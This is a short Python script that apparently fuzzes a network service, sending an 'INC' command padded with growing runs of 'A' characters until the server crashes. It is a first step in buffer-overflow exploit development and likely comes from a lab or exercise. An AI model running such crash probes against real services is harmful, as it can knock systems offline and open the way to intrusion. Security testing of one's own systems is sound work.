import socket
import sys

ip=sys.argv[1]
port=int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))
sock.settimeout(5)

data = sock.recv(4096).decode()
print(data)

try:
	for i in range(1,25):
		print("Trying length: " + str(i))
		sock.send( ("INC " + "A"*i).encode() )
		data = sock.recv(4096).decode()
		print(data)
except Exception as E:
	print(E)
	print("Server Crashed")

sock.close()
